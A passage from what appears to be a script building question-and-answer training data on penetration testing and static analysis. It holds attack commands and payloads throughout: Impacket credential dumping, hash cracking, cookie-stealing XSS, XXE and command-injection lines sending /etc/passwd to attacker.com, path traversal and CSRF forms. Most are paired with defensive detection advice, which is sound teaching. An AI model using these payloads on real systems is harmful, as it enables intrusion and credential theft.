    → Coder returns: Custom exploit script
  → Pentester: Executes exploit, gets shell, attempts privesc
    → Adviser: "Stuck on privilege escalation, found SUID binary but unsure of exploitation"
    → Adviser returns: Strategy recommendation
  → Pentester: Escalates to root, documents findings
  → Primary Agent: Compiles final report
```

**For Attestor's AI Agent Mode**: Owen Coder uses a simplified version with tools (scan_file, scan_directory, search_rules, explain_finding, suggest_fix) instead of system-level exploitation tools. The same delegation mindset applies — use the right tool for each sub-task."""
)

# ===========================================================================
# SECTION 9: SPECIFIC TOOL DEEP DIVES
# ===========================================================================

add(
    "How do penetration testers use nuclei for automated vulnerability scanning?",
    """**Nuclei** is a fast, template-based vulnerability scanner:

**Basic Scanning**
```bash
nuclei -u http://target -t cves/           # Scan for known CVEs
nuclei -u http://target -t vulnerabilities/ # General vulnerability templates
nuclei -u http://target -t misconfiguration/ # Misconfig detection
nuclei -u http://target -t exposures/       # Sensitive file/info exposure
```

**Scan from URL List**
```bash
nuclei -l urls.txt -t cves/ -c 50 -rate-limit 100
# -c: Concurrent requests
# -rate-limit: Max requests/second
```

**Severity Filtering**
```bash
nuclei -u http://target -severity critical,high
nuclei -u http://target -severity medium,low -t misconfiguration/
```

**Custom Tags**
```bash
nuclei -u http://target -tags sqli,xss,rce
nuclei -u http://target -tags cve2024
```

**Output Formats**
```bash
nuclei -u http://target -o results.txt        # Plain text
nuclei -u http://target -jsonl -o results.json # JSON lines
nuclei -u http://target -me output_dir/        # Markdown export
```

**Template Updates**
```bash
nuclei -update-templates
```

Nuclei is particularly effective because:
- Templates are community-maintained and rapidly updated for new CVEs
- Low false positive rate compared to traditional scanners
- Highly customizable — you can write templates for custom checks
- Fast — optimized for large-scale scanning
- Integrates well with automation pipelines"""
)

add(
    "Explain how to use Impacket tools for Windows/Active Directory penetration testing.",
    """**Impacket** is a Python collection of tools for network protocol interaction:

**Remote Execution**
```bash
# PsExec — creates a service, uploads executable
impacket-psexec domain/admin:password@target
impacket-psexec -hashes :NTLM_HASH domain/admin@target

# WMI Execution — uses WMI, more stealthy
impacket-wmiexec domain/admin:password@target

# SMB Execution — uses SMB named pipes
impacket-smbexec domain/admin:password@target

# DCOM Execution — uses DCOM MMC20
impacket-dcomexec domain/admin:password@target
```

**Credential Dumping**
```bash
# Dump SAM, LSA secrets, cached domain credentials
impacket-secretsdump domain/admin:password@target
impacket-secretsdump -hashes :NTLM_HASH domain/admin@target

# Extract from NTDS.dit (Domain Controller)
impacket-secretsdump -just-dc domain/admin:password@DC_IP
```

**Kerberos Attacks**
```bash
# Kerberoasting
impacket-GetUserSPNs domain/user:password -dc-ip DC_IP -request

# AS-REP Roasting
impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip DC_IP -format hashcat

# Silver Ticket
impacket-ticketer -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domain.local -spn MSSQLSvc/target admin
```

**SMB Operations**
```bash
# SMB client for file operations
impacket-smbclient domain/admin:password@target

# Enumerate shares
impacket-smbclient domain/admin:password@target -shares
```

**LDAP Queries**
```bash
# Domain enumeration via LDAP
ldapdomaindump -u domain\\user -p password DC_IP -o ldap_dump/
```

All Impacket tools accept credentials in these formats:
- `domain/user:password@target` (plaintext)
- `-hashes LM:NTLM domain/user@target` (pass-the-hash)
- `-k -no-pass domain/user@target` (Kerberos ticket)"""
)

# ===========================================================================
# SECTION 10: NETWORK RECONNAISSANCE DEEP DIVES
# ===========================================================================

add(
    "What network reconnaissance tools and techniques should a security tester use for initial target enumeration?",
    """**Host Discovery**
```bash
# Ping sweep
nmap -sn 192.168.1.0/24 -oG alive_hosts.gnmap

# ARP scan (local network)
arp-scan -l
netdiscover -r 192.168.1.0/24

# Fast mass scanning
masscan -p 1-65535 target --rate=1000 -oG masscan.gnmap
```

**DNS Enumeration**
```bash
# Subdomain discovery
amass enum -d target.com -o subdomains.txt
subfinder -d target.com -o subfinder.txt
# DNS brute force
shuffledns -d target.com -w wordlist.txt -r resolvers.txt
# DNS record enumeration
dnsx -l subdomains.txt -a -aaaa -mx -ns -cname -resp
# Zone transfer attempt
dig axfr @ns1.target.com target.com
```

**Service Enumeration**
```bash
# Detailed service scan on discovered hosts
nmap -sV -sC -p- target -oA detailed_scan
# Banner grabbing
nmap -sV --version-intensity 5 target
# UDP services (slow but important)
nmap -sU --top-ports 20 target
```

**Web Service Discovery**
```bash
# HTTP probing
httpx -l hosts.txt -title -tech-detect -status-code -content-length
# Technology detection
whatweb http://target
# Web crawling
katana -u http://target -d 3 -jc -o endpoints.txt
```

**OSINT**
```bash
# Email harvesting
theharvester -d target.com -b all
# Shodan queries (if API key available)
shodan search hostname:target.com
# Search for exposed services
censys search target.com
```

**Workflow**: host discovery → port scanning → service enumeration → web discovery → vulnerability scanning. Each phase narrows the scope for the next, making the overall process efficient."""
)

# ===========================================================================
# SECTION 11: SECURITY TOOL ANTI-PATTERNS
# ===========================================================================

add(
    "What are common mistakes when using CLI security tools, and how do you avoid them?",
    """**1. Hallucinated Flags**
AI agents and humans often invent flags that don't exist:
```bash
# WRONG — -o is not an output flag for every tool
gobuster dir -u http://target -w wordlist.txt -o results.txt  # Actually works for gobuster
hydra -l admin -P wordlist.txt target ssh -o results.txt  # Works for hydra
nmap target -o results.txt  # WRONG — nmap uses -oN/-oX/-oG/-oA
```
**Fix**: Always verify with `tool --help` before first use.

**2. Cross-Tool Flag Confusion**
Same letter means different things:
```bash
nmap -p 80     # -p = port
hydra -p pass  # -p = password
curl -p        # -p = use proxy tunnel
```

**3. Unquoted Shell Metacharacters**
Payloads with special characters get mangled by the shell:
```bash
# WRONG — shell interprets the semicolon
sqlmap -u "http://target/page?id=1;DROP TABLE users"
# RIGHT — proper quoting
sqlmap -u "http://target/page?id=1%3BDROP%20TABLE%20users"
```

**4. Missing Output Redirection**
When you need to save results:
```bash
# Use shell redirection, not invented flags
nmap -sV target > scan_results.txt 2>&1
# Or use the tool's documented output options
nmap -sV target -oN scan_results.txt
```

**5. Interactive Tool Hangs**
Running interactive tools without automation flags:
```bash
# WRONG — enters interactive mode
msfconsole
python
mysql
# RIGHT — use non-interactive mode
msfconsole -q -x "commands; exit"
python -c "script"
mysql -e "SELECT 1" -u root
```

**6. Port Conflicts**
Not checking before starting listeners:
```bash
# Always check first
netstat -tulnp | grep 4444
# Then start
nc -lvnp 4444
```

**7. Excessive Parallelism**
Too many threads causing crashes or lockouts:
```bash
# WRONG — may crash target or trigger WAF
gobuster dir -u http://target -w big_wordlist.txt -t 200
# RIGHT — reasonable thread count
gobuster dir -u http://target -w big_wordlist.txt -t 30
```"""
)

# ===========================================================================
# SECTION 12: CRYPTOGRAPHY & PASSWORD ATTACKS
# ===========================================================================

add(
    "How do penetration testers approach password cracking and what tools do they use?",
    """**Hash Identification**
```bash
hashid 'hash_value'
hash-identifier  # Interactive
# Common formats:
# MD5: 32 hex chars
# SHA1: 40 hex chars
# SHA256: 64 hex chars
# NTLM: 32 hex chars (same length as MD5, context matters)
# bcrypt: $2b$10$... or $2a$...
```

**Hashcat (GPU-accelerated, preferred)**
```bash
# MD5
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
# SHA1
hashcat -m 100 hashes.txt wordlist.txt
# NTLM
hashcat -m 1000 hashes.txt wordlist.txt
# Kerberoast (TGS-REP)
hashcat -m 13100 kerberoast.txt wordlist.txt
# AS-REP Roast
hashcat -m 18200 asrep.txt wordlist.txt
# bcrypt
hashcat -m 3200 hashes.txt wordlist.txt

# Rule-based attack (mutations)
hashcat -m 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
# Mask attack (brute force with pattern)
hashcat -m 0 hashes.txt ?u?l?l?l?d?d?d?d  # Uppercase+3lower+4digits
```

**John the Ripper (CPU-based, format detection)**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt  # Show cracked passwords

# Format-specific
john --format=raw-md5 hashes.txt
john --format=NT hashes.txt

# Extract hashes from files
ssh2john id_rsa > ssh_hash.txt
zip2john protected.zip > zip_hash.txt
keepass2john database.kdbx > keepass_hash.txt
```

**Wordlist Generation**
```bash
# Custom wordlist with crunch
crunch 8 12 -t @@@@%%%% -o custom.txt
# 8-12 chars, 4 lowercase + 4 digits

# Curated wordlists
/usr/share/wordlists/rockyou.txt          # 14M passwords
/usr/share/seclists/Passwords/            # Multiple lists
```

**Defense Perspective**
Static analysis can detect weak password hashing:
- MD5/SHA1 for passwords → CWE-328 (Use of Weak Hash)
- Missing salt → CWE-916 (Use of Password Hash With Insufficient Computational Effort)
- Recommend: bcrypt, scrypt, or Argon2id with appropriate cost factors"""
)

# ===========================================================================
# SECTION 13: WEB APPLICATION SECURITY (additional)
# ===========================================================================

add(
    "How do attackers exploit Cross-Site Scripting (XSS) vulnerabilities, and what should static analysis catch?",
    """**Types of XSS**

**Reflected XSS** — payload in URL/request, reflected in response
```
http://target/search?q=<script>alert(document.cookie)</script>
```

**Stored XSS** — payload saved in database, rendered to all users
```
Comment field: <img src=x onerror=fetch('http://attacker/'+document.cookie)>
```

**DOM-based XSS** — client-side JavaScript manipulates DOM unsafely
```javascript
// Vulnerable code
document.getElementById('output').innerHTML = location.hash.substring(1);
// Exploit: http://target/#<img src=x onerror=alert(1)>
```

**Common XSS Payloads**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<a href="javascript:alert(1)">click</a>
<input onfocus=alert(1) autofocus>
```

**Filter Bypass Techniques**
```html
<ScRiPt>alert(1)</ScRiPt>           (case variation)
<script>alert(String.fromCharCode(88,83,83))</script>  (char encoding)
<img src=x onerror=alert`1`>        (backtick instead of parens)
<svg/onload=alert(1)>               (no space needed)
```

**Impact**
- Session hijacking via cookie theft
- Account takeover
- Keylogging
- Phishing (injected login forms)
- Cryptocurrency mining
- Worm propagation

**What Static Analysis (Attestor) Should Catch — CWE-79**
```python
# VULNERABLE — user input directly in HTML
return f"<p>Hello {request.args.get('name')}</p>"
# VULNERABLE — innerHTML assignment
element.innerHTML = user_input
# VULNERABLE — template without auto-escaping
render_template_string(f"<p>{user_input}</p>")

# SAFE — properly escaped
from markupsafe import escape
return f"<p>Hello {escape(request.args.get('name'))}</p>"
# SAFE — template engine with auto-escaping (Jinja2 default)
return render_template("page.html", name=user_input)
```"""
)

add(
    "Explain path traversal attacks and how to detect them in code.",
    """**Path Traversal (Directory Traversal) — CWE-22**

Attackers escape the intended directory to access arbitrary files:

**Basic Attack Patterns**
```
../../../etc/passwd
..\\..\\..\\windows\\system32\\config\\sam
....//....//....//etc/passwd  (double encoding bypass)
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd  (URL encoding)
..%252f..%252f..%252fetc%252fpasswd  (double URL encoding)
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd  (UTF-8 overlong encoding)
```

**Vulnerable Code Patterns**
```python
# Python — VULNERABLE
@app.route('/download')
def download():
    filename = request.args.get('file')
    return send_file(f'/uploads/{filename}')  # CWE-22

# Java — VULNERABLE
String path = request.getParameter("file");
File f = new File("/uploads/" + path);  // CWE-22

# Node.js — VULNERABLE
app.get('/file', (req, res) => {
    res.sendFile(path.join(__dirname, 'uploads', req.query.file));  // CWE-22
});
```

**Exploitation**
```
GET /download?file=../../../etc/passwd HTTP/1.1
GET /download?file=....//....//....//etc/shadow HTTP/1.1
GET /download?file=%2e%2e%2fetc%2fpasswd HTTP/1.1
```

**High-Value Targets**
```
/etc/passwd, /etc/shadow           # Linux credentials
/proc/self/environ                 # Environment variables (secrets!)
/var/log/apache2/access.log        # Log poisoning for RCE
C:\\Windows\\system32\\config\\sam    # Windows SAM database
web.config, .env, config.php       # Application secrets
```

**Safe Code**
```python
# Python — SAFE
import os
@app.route('/download')
def download():
    filename = request.args.get('file')
    # Resolve to absolute path and verify it's within allowed directory
    base = os.path.abspath('/uploads')
    filepath = os.path.abspath(os.path.join(base, filename))
    if not filepath.startswith(base):
        abort(403)
    return send_file(filepath)
```

**Detection**: Attestor checks for user input flowing into file operations without path validation — os.path.join with untrusted components, open() with concatenated paths, send_file/send_from_directory with unvalidated filenames."""
)

# ===========================================================================
# SECTION 14: ATTESTOR-SPECIFIC SECURITY KNOWLEDGE
# ===========================================================================

add(
    "How does understanding attacker methodology improve static analysis detection rules?",
    """Understanding how attackers exploit vulnerabilities directly improves static analysis quality:

**1. Prioritization by Exploitability**
Attacker knowledge tells us which findings are actually dangerous:
- SQL injection in a login form (internet-facing, unauthenticated) → CRITICAL
- SQL injection in admin panel (requires auth) → HIGH
- SQL injection in offline batch script → MEDIUM
Static analysis should weight findings by their attack surface exposure.

**2. Attack Chain Awareness**
Individual findings become more severe in combination:
- SSRF + cloud metadata access → credential theft
- XSS + no CSRF tokens → account takeover
- File upload + path traversal → remote code execution
- SQL injection + stacked queries → OS command execution
Detection rules should flag these combinations with elevated severity.

**3. False Positive Reduction**
Attacker experience teaches what's actually exploitable:
- `subprocess.run(["command", validated_arg])` — NOT exploitable (array form)
- `cursor.execute("SELECT * FROM t WHERE id = ?", (int(input),))` — safe (parameterized + type-cast)
- ORM queries with user input — framework handles escaping
Models trained on pentest data (like Owen Coder with PentAGI knowledge) better distinguish real vulnerabilities from safe patterns.

**4. Fix Quality**
Knowing how attackers bypass defenses improves fix recommendations:
- Don't recommend blocklist filtering for XSS (bypassable) → recommend output encoding
- Don't recommend client-side validation only → require server-side validation
- Don't recommend MD5 for passwords → recommend bcrypt/argon2
- Don't recommend CORS with `Access-Control-Allow-Origin: *` → use specific origins

**5. CWE Mapping Accuracy**
Pentest experience maps real attacks to precise CWE identifiers:
- String concatenation in SQL → CWE-89 (not just "code quality")
- `os.system(user_input)` → CWE-78 (OS Command Injection, not CWE-77)
- `pickle.loads(network_data)` → CWE-502 (Deserialization of Untrusted Data)
Accurate CWE mapping helps developers find the right fix guidance."""
)

add(
    "What security vulnerabilities should a static analysis engine detect in infrastructure-as-code and configuration files?",
    """Infrastructure-as-Code (IaC) and config files contain security issues that complement traditional code analysis:

**Docker/Container Security**
```dockerfile
# VULNERABLE — running as root (CWE-250)
FROM ubuntu:latest
RUN apt-get install -y nginx
CMD ["nginx"]  # Runs as root by default

# SAFE
FROM ubuntu:latest
RUN apt-get install -y nginx && useradd -r nginx
USER nginx
CMD ["nginx"]
```

**Kubernetes Manifests**
```yaml
# VULNERABLE — privileged container
spec:
  containers:
  - name: app
    securityContext:
      privileged: true  # Full host access!
      runAsRoot: true

# VULNERABLE — no resource limits (DoS risk)
spec:
  containers:
  - name: app
    # Missing: resources.limits.cpu, resources.limits.memory
```

**Terraform / Cloud Config**
```hcl
# VULNERABLE — public S3 bucket
resource "aws_s3_bucket" "data" {
  acl = "public-read"  # Anyone can read!
}

# VULNERABLE — open security group
resource "aws_security_group_rule" "ssh" {
  cidr_blocks = ["0.0.0.0/0"]  # SSH from anywhere
  from_port   = 22
  to_port     = 22
}
```

**CI/CD Pipeline Security**
```yaml
# VULNERABLE — secrets in environment variables visible in logs
env:
  DB_PASSWORD: "hardcoded_password"  # CWE-798

# VULNERABLE — unpinned actions (supply chain risk)
uses: actions/checkout@main  # Should pin to hash
```

**Nginx/Apache Config**
```nginx
# VULNERABLE — directory listing enabled
autoindex on;  # Exposes file structure

# VULNERABLE — missing security headers
# Should add: X-Content-Type-Options, X-Frame-Options, CSP

# VULNERABLE — server version exposed
server_tokens on;  # Reveals nginx version
```

These are the types of findings that complement Attestor's code-level analysis — configuration security is equally important as code security."""
)

# ===========================================================================
# SECTION 15: TRAFFIC ANALYSIS & NETWORK SECURITY
# ===========================================================================

add(
    "How do penetration testers capture and analyze network traffic?",
    """**tcpdump — Quick Capture**
```bash
# Capture all traffic on interface
tcpdump -i eth0 -w capture.pcap

# Filter by host
tcpdump -i eth0 host 10.0.0.5 -w target.pcap

# Filter by port
tcpdump -i eth0 port 80 -w http.pcap

# Filter by protocol
tcpdump -i eth0 tcp and port 443

# Show packet content
tcpdump -i eth0 -A port 80  # ASCII
tcpdump -i eth0 -X port 80  # Hex + ASCII
```

**tshark — Wireshark CLI (detailed analysis)**
```bash
# Read pcap with display filter
tshark -r capture.pcap -Y "http.request.method == POST"

# Extract HTTP credentials
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.host -e http.request.uri -e urlencoded-form.value

# Extract DNS queries
tshark -r capture.pcap -Y "dns.qr == 0" -T fields -e dns.qry.name

# Follow TCP stream
tshark -r capture.pcap -z follow,tcp,ascii,0
```

**SSL/TLS Testing**
```bash
# Test SSL/TLS configuration
sslscan target:443

# Check for weak ciphers
nmap --script ssl-enum-ciphers -p 443 target
```

**MitM with mitmproxy**
```bash
# Start transparent proxy
mitmproxy -p 8080

# Dump mode (non-interactive)
mitmdump -p 8080 -w traffic.flow

# Script injection
mitmdump -p 8080 -s inject_script.py
```

**What to Look For**
- Cleartext credentials (HTTP basic auth, FTP, telnet)
- Unencrypted sensitive data (API keys, tokens, PII)
- DNS queries revealing internal hostnames
- Certificate errors indicating MitM possibilities
- Internal IP addresses leaked in headers

**Defense**: Static analysis should flag code that transmits sensitive data over unencrypted channels — HTTP instead of HTTPS, FTP instead of SFTP, telnet instead of SSH (CWE-319: Cleartext Transmission of Sensitive Information)."""
)

# ===========================================================================
# SECTION 16: ADVANCED WEB ATTACKS
# ===========================================================================

add(
    "How do attackers exploit XML External Entity (XXE) injection vulnerabilities?",
    """**XXE Injection — CWE-611**

XXE exploits XML parsers that process external entity references:

**Basic XXE — File Read**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**Blind XXE — Out-of-Band Data Exfiltration**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>&send;</root>

<!-- evil.dtd on attacker server -->
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param "<!ENTITY send SYSTEM 'http://attacker.com/?d=%data;'>">
%param;
```

**XXE for SSRF**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

**XXE via File Upload**
```xml
<!-- SVG file with XXE -->
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

**Vulnerable Code**
```python
# Python — VULNERABLE
from lxml import etree
tree = etree.parse(user_uploaded_xml)  # CWE-611

# Java — VULNERABLE
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(input);  # CWE-611
```

**Safe Code**
```python
# Python — SAFE (disable external entities)
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.parse(source, parser)

# Java — SAFE
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
```

**Detection**: Attestor should flag XML parsing without explicit entity resolution disabling, especially when processing user-uploaded files."""
)

add(
    "Explain Cross-Site Request Forgery (CSRF) attacks and how to prevent them.",
    """**CSRF — CWE-352**

CSRF tricks an authenticated user's browser into making unintended requests:

**Attack Scenario**
1. User is logged into bank.com
2. User visits attacker.com (or clicks malicious link)
3. Attacker's page triggers a request to bank.com using user's session cookies
4. Bank processes the request as if the user initiated it

**Attack Payloads**
```html
<!-- Auto-submitting form -->
<form action="https://bank.com/transfer" method="POST" id="csrf">
    <input type="hidden" name="to" value="attacker"/>
    <input type="hidden" name="amount" value="10000"/>
</form>
<script>document.getElementById('csrf').submit();</script>

<!-- Image tag (GET-based CSRF) -->
<img src="https://bank.com/transfer?to=attacker&amount=10000"/>

<!-- XHR-based (if CORS misconfigured) -->
<script>
fetch('https://bank.com/api/transfer', {
    method: 'POST',
    credentials: 'include',
    body: JSON.stringify({to: 'attacker', amount: 10000})
});
</script>
```

**Prevention Mechanisms**
1. **CSRF Tokens** — unique per-session or per-request token in forms
```html
<form method="POST">
    <input type="hidden" name="csrf_token" value="random_token_here"/>
</form>
```

2. **SameSite Cookies** — prevent cookies from being sent cross-origin
```
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

3. **Origin/Referer Header Validation** — check request source
```python
if request.headers.get('Origin') != 'https://bank.com':
    abort(403)
```

4. **Double-Submit Cookie Pattern**
```python
# Set CSRF token in cookie AND form field
# Server verifies they match
```

**What Attestor Should Detect**
- State-changing endpoints (POST/PUT/DELETE) without CSRF token validation
- Forms without hidden CSRF token fields
- Missing SameSite attribute on session cookies
- CORS configuration with `Access-Control-Allow-Origin: *` and `Allow-Credentials: true`"""
)

# ===========================================================================
# SECTION 17: REVERSE ENGINEERING & BINARY ANALYSIS
# ===========================================================================

add(
    "What reverse engineering tools and techniques do security testers use for binary analysis?",
    """**Static Analysis Tools**

**strings — Quick Extraction**
```bash
strings binary | grep -i password
strings binary | grep -i flag
strings -n 8 binary  # Min 8 chars (reduce noise)
```

**binwalk — Firmware/Embedded Analysis**
```bash
binwalk firmware.bin           # Identify embedded files
binwalk -e firmware.bin        # Extract embedded files
binwalk --entropy firmware.bin # Entropy analysis (detect encryption/compression)
```

**radare2 / r2 — Disassembly**
```bash
r2 -A binary              # Open with auto-analysis
[0x00401000]> afl          # List functions
[0x00401000]> pdf @main    # Disassemble main
[0x00401000]> iz           # List strings
[0x00401000]> axt @sym.password_check  # Cross-references
```

**objdump — Quick Disassembly**
```bash
objdump -d binary | grep -A 20 '<main>'
objdump -s -j .rodata binary  # String constants
```

**Dynamic Analysis**

**ltrace/strace — System Call Tracing**
```bash
strace ./binary                # Trace system calls
ltrace ./binary                # Trace library calls
strace -e open,read ./binary   # Filter specific syscalls
```

**Exploit Development Tools**

**ROPgadget — ROP Chain Building**
```bash
ROPgadget --binary binary --ropchain
ROPgadget --binary binary | grep "pop rdi"
```

**ropper**
```bash
ropper --file binary --search "pop rdi"
```

**Pattern Generation (buffer overflow)**
```bash
msf-pattern_create -l 1000  # Generate unique pattern
msf-pattern_offset -q 0x41366441  # Find offset in pattern
msf-find_badchars  # Identify bad characters for shellcode
```

**Steganography**
```bash
steghide extract -sf image.jpg     # Extract hidden data
foremost -i file -o output_dir     # Carve files from data
bulk_extractor -o output image.dd  # Extract artifacts from disk image
```

These tools complement static analysis — understanding binary exploitation helps identify buffer overflow vulnerabilities (CWE-120), format string bugs (CWE-134), and use-after-free (CWE-416) in source code."""
)

# ===========================================================================
# SECTION 18: SECURE CODING FROM PENTEST PERSPECTIVE
# ===========================================================================

add(
    "What secure coding practices prevent the most common vulnerabilities exploited in penetration tests?",
    """Based on real-world penetration testing experience, these practices prevent the most exploited vulnerabilities:

**1. Parameterized Queries (Prevents SQLi — CWE-89)**
```python
# Every database interaction uses parameterized queries
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
# NEVER: f"SELECT * FROM users WHERE id = {user_id}"
```

**2. Output Encoding (Prevents XSS — CWE-79)**
```python
# Use template engine auto-escaping (Jinja2, React JSX)
# Manual: escape before inserting into HTML context
from markupsafe import escape
html = f"<p>{escape(user_input)}</p>"
```

**3. Input Validation at Boundaries**
```python
# Validate type, length, format, range
def validate_user_id(value):
    try:
        uid = int(value)
        if uid < 1 or uid > 1000000:
            raise ValueError
        return uid
    except (ValueError, TypeError):
        abort(400)
```

**4. Subprocess Without Shell (Prevents Command Injection — CWE-78)**
```python
# Use list form, never shell=True with user input
subprocess.run(["ping", "-c", "1", validated_host], timeout=10)
```

**5. Path Validation (Prevents Path Traversal — CWE-22)**
```python
base = os.path.abspath("/uploads")
requested = os.path.abspath(os.path.join(base, filename))
assert requested.startswith(base + os.sep)
```

**6. Strong Password Hashing**
```python
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
```

**7. CSRF Protection**
```python
# Framework-provided CSRF tokens on all state-changing forms
# SameSite=Strict on session cookies
```

**8. Secure Deserialization**
```python
# NEVER pickle.loads() on untrusted data
# Use JSON for data interchange
data = json.loads(user_input)  # Safe — no code execution
```

**9. Least Privilege**
```python
# Run services as non-root
# Use minimal database permissions
# Restrict file system access
```

**10. Secrets Management**
```python
# Environment variables or secrets manager, never hardcoded
db_password = os.environ["DB_PASSWORD"]
```"""
)

# ===========================================================================
# SECTION 19: ATTESTOR + PENTEST TOOL COMBINATIONS
# ===========================================================================

add(
    "How can Attestor's static analysis findings be used to guide targeted penetration testing?",
    """Attestor findings map directly to pentest attack vectors:

**SQL Injection Findings → sqlmap Testing**
```
Attestor Finding: CWE-89 at login.py:45
  query = f"SELECT * FROM users WHERE name='{username}'"

Targeted Pentest:
  sqlmap -u "http://target/login" --data="username=admin&password=test" -p username --batch
```

**Command Injection Findings → Manual Exploitation**
```
Attestor Finding: CWE-78 at utils.py:23
  os.system(f"ping {host}")

Targeted Pentest:
  curl "http://target/ping?host=127.0.0.1;id"
  curl "http://target/ping?host=127.0.0.1|cat+/etc/passwd"
```

**Path Traversal Findings → File Access**
```
Attestor Finding: CWE-22 at download.py:15
  return send_file(os.path.join('/uploads', request.args['file']))

Targeted Pentest:
  curl "http://target/download?file=../../../etc/passwd"
```

**Hardcoded Credentials → Direct Access**
```
Attestor Finding: CWE-798 at config.py:8
  DB_PASSWORD = "admin123"

Targeted Pentest:
  mysql -u admin -padmin123 -h target
  hydra -l admin -p admin123 target ssh
```

**XSS Findings → Session Hijacking**
```
Attestor Finding: CWE-79 at views.py:30
  return f"<p>Search: {request.args['q']}</p>"

Targeted Pentest:
  http://target/search?q=<script>fetch('http://attacker/steal?c='+document.cookie)</script>
```

**Workflow Integration**
1. Run `attestor scan src/` to identify findings
2. Map findings to CWE categories
3. Prioritize by severity and exposure (internet-facing endpoints first)
4. Use findings to guide targeted manual testing
5. Verify exploitability to filter false positives
6. Report confirmed vulnerabilities with PoC

This bidirectional flow — static analysis informs pentest targeting, pentest results validate static analysis accuracy — creates a feedback loop that improves both over time."""
)

# ===========================================================================
# SECTION 20: ADDITIONAL SECURITY TOPICS FROM PENTAGI
# ===========================================================================

add(
    "What is out-of-band (OOB) exploitation and when do penetration testers use it?",
    """**Out-of-Band (OOB) Exploitation** uses a secondary channel to exfiltrate data when the primary response channel doesn't reflect results (blind vulnerabilities):

**When to Use OOB**
- Blind SQL injection (no error messages, no visible output differences)
- Blind command injection (command executes but output isn't returned)
- Blind XXE (XML parsed but entity content not displayed)
- Blind SSRF (request made but response not returned to attacker)

**OOB Techniques**

**DNS-based Exfiltration** (most reliable — DNS almost always allowed)
```bash
# Blind SQLi via DNS
' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\share\\file'))--
# Blind command injection via DNS
; nslookup $(whoami).attacker.com
# Blind XXE via DNS
<!ENTITY xxe SYSTEM "http://data.attacker.com/">
```

**HTTP-based Callbacks**
```bash
# Blind command injection
; curl http://attacker.com/$(cat /etc/passwd | base64)
# Blind SSRF verification
url=http://attacker-server.com/ssrf-proof
# Blind XXE
<!ENTITY xxe SYSTEM "http://attacker.com/?data=exfiltrated">
```

**Infrastructure Setup**
Penetration testers set up callback infrastructure:
- DNS server (custom authoritative NS for a domain)
- HTTP server (`python3 -m http.server 80`)
- Netcat listener (`nc -lvnp 4444`)
- Burp Collaborator / interact.sh (managed callback services)

**Defense Perspective**
Static analysis should flag patterns that enable OOB:
- Outbound HTTP requests from server-side code processing user input (SSRF)
- DNS resolution functions with user-controlled hostnames
- XML parsers allowing external entities (XXE)
- Database functions that make network calls (LOAD_FILE, UTL_HTTP)"""
)

add(
    "How do security teams use knowledge graphs to track and correlate findings across large penetration testing engagements?",
    """Knowledge graphs store structured relationships between all entities discovered during an engagement:

**Building the Graph During Testing**

As each phase progresses, entities and edges are added:

**Phase 1: Reconnaissance**
```
Added: Host(10.0.0.5), Port(80/TCP), Port(443/TCP), Port(22/TCP)
Added: Service(Apache/2.4.49), Service(OpenSSH/8.2)
Edges: Host→HAS_PORT→Port→RUNS_SERVICE→Service
```

**Phase 2: Enumeration**
```
Added: WebApp(WordPress 5.8), Endpoint(/wp-login.php), Endpoint(/wp-admin/)
Added: Account(admin@wordpress)
Edges: Service→HOSTS_APP→WebApp→HAS_ENDPOINT→Endpoint
```

**Phase 3: Vulnerability Assessment**
```
Added: Vulnerability(CVE-2021-41773, CVSS 7.5)
Edge: Service(Apache)→DETECTED_VULNERABILITY→Vulnerability
```

**Phase 4: Exploitation**
```
Updated: DETECTED→CONFIRMED→HAS_VULNERABILITY (exploitation successful)
Added: Credential(www-data shell), ValidAccess(Host:10.0.0.5)
Edge: Credential→YIELDED_ACCESS→Host
```

**Phase 5: Post-Exploitation**
```
Added: Vulnerability(CVE-2021-4034, PwnKit, privesc)
Edge: Host→ESCALATED_VIA→Vulnerability
Added: Host(10.0.0.10, Domain Controller)
Edge: Host(10.0.0.5)→PIVOTED_TO→Host(10.0.0.10)
```

**Querying the Graph**
- "Find all paths from internet-facing services to domain admin"
- "List all unverified vulnerabilities that need manual confirmation"
- "Show which credentials gave access to which hosts"
- "What tools were successfully used against similar services?"

**Benefits for Large Engagements**
- Avoid repeating failed approaches
- Identify attack paths that span multiple systems
- Ensure complete coverage (every host/service tested)
- Generate structured reports automatically
- Enable team coordination (multiple testers, shared context)

This approach is used by PentAGI's Graphiti temporal knowledge graph and can inform how static analysis tools like Attestor correlate findings across a codebase — connecting a SQL injection in one module to the database schema in another."""
)

# ===========================================================================
# SECTION 21: DOCKER & CONTAINER SECURITY
# ===========================================================================

